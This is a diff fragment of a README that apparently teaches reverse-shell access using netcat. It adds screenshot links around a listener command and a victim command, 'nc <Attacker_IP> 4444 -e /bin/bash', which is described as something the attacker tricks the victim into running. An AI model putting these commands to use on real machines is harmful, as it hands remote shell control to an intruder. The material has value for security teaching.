@@ -19,15 +19,23 @@ Victim's Machine: When compromised, it connects back to the attacker's machine, 
 
 **Command**: ncat -lvp 4444
 
+![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/26834eb6bf472a46292b847cb73028b8c8d6a0c7/images/1.png)
+
 **This means**: "Listen on port 4444 and wait for a connection."
 
 **Victim** (Linux): The attacker tricks the victim into running a command.
 
 **Command**: nc <**Attacker_IP**> 4444 -e /bin/bash
 
+![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/26834eb6bf472a46292b847cb73028b8c8d6a0c7/images/2.png)
+
 **This means**: "Connect to the attacker's IP on port 4444 and give them access to my shell."
 
+![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/26834eb6bf472a46292b847cb73028b8c8d6a0c7/images/3.png)
+
 **Result**: The attacker now controls the Linux machine from the Windows machine.
+
+![Image Alt](https://github.com/goutham10248/Reverse-shell-access-using-netcat/blob/26834eb6bf472a46292b847cb73028b8c8d6a0c7/images/4.png)
 
 # Example 2: Attacker on Linux, Victim on Windows
 **Attacker** (Linux): Listens for incoming connections.
